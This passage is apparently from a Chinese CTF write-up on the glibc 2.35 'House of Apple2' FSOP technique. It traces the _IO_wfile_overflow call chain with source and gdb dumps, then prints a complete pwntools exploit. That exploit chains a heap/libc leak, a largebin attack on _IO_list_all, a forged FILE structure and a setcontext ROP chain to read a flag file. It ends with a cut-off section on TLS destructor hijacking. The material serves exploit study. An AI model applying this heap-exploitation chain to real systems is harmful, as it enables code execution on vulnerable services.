class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">► <span class="hljs-number">0x7fa07cfdfc6f</span> &lt;_IO_flush_all_lockp+<span class="hljs-number">207</span>&gt;    call   qword ptr [rax + <span class="hljs-number">0x18</span>]        &lt;_IO_wfile_overflow&gt;<br><br>    <br>_IO_wfile_overflow (FILE *f, <span class="hljs-type">wint_t</span> wch)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="hljs-comment">/* SET ERROR */</span><br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> WEOF;<br>    &#125;<br>  <span class="hljs-comment">/* If currently reading or no buffer allocated. */</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Allocate a buffer if needed. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-number">0</span>)<br>    &#123;<br>      _IO_wdoallocbuf (f);<span class="hljs-comment">// 需要走到这里</span><br>      <span class="hljs-comment">// ......</span><br>    &#125;<br>    &#125;<br>&#125;<br>    <br></code></pre></td></tr></table></figure><h4 id="IO-wdoallocbuf"><a href="#IO-wdoallocbuf" class="headerlink" title="_IO_wdoallocbuf"></a><strong>_IO_wdoallocbuf</strong></h4><p><code>条件：fp-&gt;_wide_data-&gt;_IO_buf_base != 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">► <span class="hljs-number">0x7fb8e0ba5d20</span> &lt;_IO_wfile_overflow+<span class="hljs-number">544</span>&gt;    call   _IO_wdoallocbuf                &lt;_IO_wdoallocbuf&gt;<br><br>    <br><span class="hljs-type">void</span> _IO_wdoallocbuf (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="hljs-comment">// _IO_WXXXX调用</span><br>      <span class="hljs-keyword">return</span>;<br>  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,<br>             fp-&gt;_wide_data-&gt;_shortbuf + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br>libc_hidden_def (_IO_wdoallocbuf)<br>    <br><br></code></pre></td></tr></table></figure><h4 id="IO-wxxxxx"><a href="#IO-wxxxxx" class="headerlink" title="_IO_wxxxxx"></a><strong>_IO_wxxxxx</strong></h4><p><code>条件：fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> RAX  0x557e9eedfec0 ◂— 0x620<br> RBX  0xffffffff<br> RCX  0x6c0<br> RDX  0x621<br> RDI  0x557e9eedf8a0 ◂— 0xfffff7f5<br> RSI  0x557e9eede800 ◂— 0x67616c662f2e /* &#x27;./flag&#x27; */<br> R8   0x3<br> R9   0x7ffd3e48cee0 —▸ 0x7fb8e0d1bbe0 (initial) ◂— 0x0<br> R10  0x20<br> R11  0x7ffd3e48ce00 —▸ 0x7fb8e0d632e0 —▸ 0x557e9e0ab000 ◂— 0x10102464c457f<br> R12  0x0<br> R13  0x7fb8e0d1a980 (_IO_helper_jumps) ◂— 0x0<br> R14  0x7ffd3e48ce90 —▸ 0x7fb8e0bab780 (flush_cleanup) ◂— endbr64 <br> R15  0x0<br> RBP  0x557e9eedf8a0 ◂— 0xfffff7f5<br> RSP  0x7ffd3e48ce48 —▸ 0x557e9eedfec0 ◂— 0x620<br>*RIP  0x7fb8e0c6e1e8 (getkeyserv_handle+536) ◂— call   qword ptr [rdx + 0x20] <br>    <br>► 0x7fb8e0ba36e8 &lt;_IO_wdoallocbuf+40&gt;    call   qword ptr [rax + 0x68]<br>    <br>Magic_gadget:<br>  0x7fb8e0c6e1e0 &lt;getkeyserv_handle+528&gt;    mov    rdx, qword ptr [rdi + 8]<br>  0x7fb8e0c6e1e4 &lt;getkeyserv_handle+532&gt;    mov    qword ptr [rsp], rax<br>► 0x7fb8e0c6e1e8 &lt;getkeyserv_handle+536&gt;    call   qword ptr [rdx + 0x20]<br><br></code></pre></td></tr></table></figure><p><strong>（GLibc2.35_3.1）这里不能用之前的Magic_gadget，rdi恒为largebin chunk，导致rdx+0x20不能call到setcontext+61</strong></p><p>在Glibc2.36中，可以用这段</p><p><code> mov rdx, qword ptr [rax + 0x38]; mov rdi, rax; call qword ptr [rdx + 0x20];</code></p><p><strong>改进一下Glibc 2.35的gadget：</strong></p><p>开始思路想找中转站，继续用之前的magic，但是后面找到个能通过rax直接控rdx的</p><p><code>0x00000000000fc83b : mov rdx, qword ptr [rax + 0xb0] ; call qword ptr [rax + 0x88]</code></p><p>通过这个gadget，再布置下堆3，就能orw了</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#------------------------ MENU  ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>s(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">4</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_fake_file</span>(<span class="hljs-params">addr, vtable, _wide_data, rdx=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-comment">#flag = 0xFBAD2887</span><br>    <span class="hljs-comment">#fake_file = p64(flag)  # _flags</span><br>    <span class="hljs-comment">#fake_file += p64(addr)  # _IO_read_ptr</span><br>    fake_file = <span class="hljs-string">b&quot;&quot;</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_base</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_write_base</span><br>    fake_file += p64(addr + <span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>    fake_file += p64(rdx)  <span class="hljs-comment"># _IO_write_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_buf_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_save_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_backup_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_save_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _markers</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain   could be a anathor file struct</span><br>    fake_file += p32(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _fileno</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _flags2</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _old_offset</span><br>    fake_file += p16(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _cur_column</span><br>    fake_file += p8(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _vtable_offset</span><br>    fake_file += p8(<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># _shortbuf</span><br>    fake_file += p32(<span class="hljs-number">0</span>)<br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _lock</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _offset</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _codecvt</span><br>    fake_file += p64(_wide_data)  <span class="hljs-comment"># _wide_data</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_list</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_buf</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># __pad5</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(vtable)  <span class="hljs-comment"># vtable</span><br>    <span class="hljs-keyword">return</span> fake_file<br><br><span class="hljs-comment">#------------------------ 1. heap &amp; libc  ----------------------------</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">1360</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">1360</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">1280</span>)<br><br>show(<span class="hljs-number">2</span>)<br><br>malloc_hook = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">1184</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;main_arena&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">15</span> + <span class="hljs-string">b&quot;b&quot;</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> ,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span> <br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br><span class="hljs-comment">#---------------------- 2. large bin attack ----------------- </span><br>_IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>_IO_list_all_chain = _IO_list_all + <span class="hljs-number">0x88</span> <span class="hljs-comment">#_chain</span><br><br>fd = libc_base + <span class="hljs-number">0x1F3150</span><br>bk = libc_base + <span class="hljs-number">0x1F3150</span><br>fd_nextsize = heap_base + <span class="hljs-number">0xD50</span><br><br><span class="hljs-comment">#largebin</span><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">1568</span>) <span class="hljs-comment">#0x620,UAF -&gt; large bin</span><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">1304</span>) <span class="hljs-comment">#fen+0x8</span><br>add(<span class="hljs-number">5</span>, <span class="hljs-number">1552</span>) <span class="hljs-comment">#0x610</span><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">1296</span>) <span class="hljs-comment">#fen,0x510</span><br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">1584</span>) <span class="hljs-comment">#0x630</span><br><br>free(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment">#keep the large_bin_chunk</span><br>edit(<span class="hljs-number">3</span>, p64(fd) + p64(bk) + p64(fd_nextsize)+ p64(_IO_list_all_chain-<span class="hljs-number">0x20</span>)) <br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">1584</span>)<span class="hljs-comment">#ATTACK</span><br><br><span class="hljs-comment">#---------------------- 3. Gadget -----------------</span><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002da82</span><br>pop_rsi = libc_base + <span class="hljs-number">0x0000000000037bea</span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000446a0</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x00000000001070f1</span><br>ret = libc_base + <span class="hljs-number">0x000000000002c7ad</span><br><br><br>Magic_gadget = libc_base + <span class="hljs-number">0x00000000000fc83b</span><br><br>setcontext_61 = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br><br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>_IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_wfile_jumps&quot;</span>]<br>lg(<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>)<br><br><span class="hljs-comment">#---------------------- 4. House of apple2(Great) -----------------</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">_IO_wfile_overflow</span><br><span class="hljs-string">    _IO_wdoallocbuf</span><br><span class="hljs-string">        _IO_WDOALLOCATE</span><br><span class="hljs-string">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br><span class="hljs-string">                magic_gadget</span><br><span class="hljs-string">                    setcontext+61</span><br><span class="hljs-string">                        orw</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">large_binfake_IO_FILE_plus:</span><br><span class="hljs-string">flag = ~(2 | 0x8 | 0x800)</span><br><span class="hljs-string">vtable = _IO_wfile_jumps</span><br><span class="hljs-string">_wide_data = chunkA  (fake_wide_data)</span><br><span class="hljs-string">_IO_write_end -&gt; Magic_gadget</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkA-----&gt;_wide_data:</span><br><span class="hljs-string">_IO_write_base = 0</span><br><span class="hljs-string">_IO_buf_base = 0</span><br><span class="hljs-string">_wide_vtable = chunkB/C (doallocate_addr)</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkA+0xE0-----&gt;_wide_vtable:</span><br><span class="hljs-string">doallocate = chunkC (setcontext+orw)</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkB----&gt;Magic_gadget +  setcontext_61 &amp;&amp; orw</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#&amp;target ==  chunk5_addr</span><br><br><span class="hljs-comment">#point the chunk head</span><br>chunk_5 = heap_base + <span class="hljs-number">0xd50</span>  <span class="hljs-comment">#fake_IO_FILE_PLUS</span><br>chunk_1 = heap_base + <span class="hljs-number">0x7f0</span>  <span class="hljs-comment">#fake_wide_data</span><br>chunk_6 = heap_base + <span class="hljs-number">0x1ec0</span> <span class="hljs-comment">#setcontext_orw</span><br>flag_addr = chunk_1 + <span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;chunk_5&#x27;</span>) <br>lg(<span class="hljs-string">&#x27;chunk_1&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;chunk_6&#x27;</span>)<br><br><br><span class="hljs-comment">#1.setcontext_orw</span><br><span class="hljs-comment">#orw</span><br>payload =  p64(<span class="hljs-number">0</span>)*<span class="hljs-number">10</span> <br>payload += p64(<span class="hljs-number">0</span>) + p64(Magic_gadget)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>  + p64(setcontext_61)<br>payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span><br>payload += p64(chunk_6+<span class="hljs-number">0xC0</span>-<span class="hljs-number">0x8</span>) + p64(ret)<br>payload += p64(chunk_6)<br>payload += flat([<br>pop_rdi, flag_addr, pop_rsi, <span class="hljs-number">0</span>, open_addr,<br>pop_rdi, <span class="hljs-number">3</span>, pop_rsi, flag_addr+<span class="hljs-number">0x300</span>, pop_rdx_r12, <span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>, read, <br>pop_rdi, flag_addr+<span class="hljs-number">0x300</span>, puts,<br>])<br>edit(<span class="hljs-number">6</span>, payload)<br><br><br><span class="hljs-comment">#2.doallocate </span><br>jump = chunk_6 + <span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;jump&#x27;</span>)<br><br><span class="hljs-comment">#3.fake_wide_data</span><br>fake_wide_data = chunk_1 + <span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;fake_wide_data&#x27;</span>)<br><br>_wide_data = &#123;<br>    <span class="hljs-number">0</span>: <span class="hljs-string">b&quot;./flag\x00\x00&quot;</span>,<br>    <span class="hljs-number">0x18</span>: <span class="hljs-number">0</span>,  <span class="hljs-comment">#IO_write_base</span><br>    <span class="hljs-number">0x30</span>: <span class="hljs-number">0</span>,  <span class="hljs-comment">#_IO_buf_base</span><br>    <span class="hljs-number">0xE0</span>: jump-<span class="hljs-number">0x10</span>,<span class="hljs-comment">#setcontext    </span><br>&#125;<br>edit(<span class="hljs-number">1</span>, flat(_wide_data))<br><br><br><span class="hljs-comment">#4.fake_IO_FILE_plus</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> c_uint32<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0x510</span> + p64(c_uint32(~(<span class="hljs-number">2</span> | <span class="hljs-number">0x8</span> | <span class="hljs-number">0x800</span>)).value))<br><br><span class="hljs-comment">#vtable, _wide_data, _IO_write_end</span><br>edit(<span class="hljs-number">5</span>, build_fake_file(<span class="hljs-number">0</span>, _IO_wfile_jumps, fake_wide_data, Magic_gadget))<br><br><span class="hljs-comment">#debug()</span><br><br>menu(<span class="hljs-number">5</span>)<br><br><br>pi()<br></code></pre></td></tr></table></figure><p>学这些：</p><p><a href="https://dreamkecat.github.io/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/">https://dreamkecat.github.io/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/</a></p><p><a href="https://www.cnblogs.com/7resp4ss/p/16891099.html#house-of-apple2%E6%96%B0%E7%9A%84fsop">https://www.cnblogs.com/7resp4ss/p/16891099.html#house-of-apple2%E6%96%B0%E7%9A%84fsop</a></p><p>PS：开始没找到这些文章，没有前置知识的情况下，硬啃house of apple2，真的太折磨了T_T</p><h3 id="tls-劫持-exit-执行流"><a href="#tls-劫持-exit-执行流" class="headerlink" title="tls 劫持 exit 执行流"></a>tls 劫持 exit 执行流</h3><p><strong>了解一下</strong></p><p><a href="https://tttang.com/archive/1749/">https://tttang.com/archive/1749/</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>exit函数会先调用<code>__run_exit_handlers</code>函数，而该函数会判断<code>__call_tls_dtors</code>和<code>run_dtors</code>这两个变量的值是否为空，然后调用<code>__call_tls_dtors()</code></p><p>call_tls_dtors汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 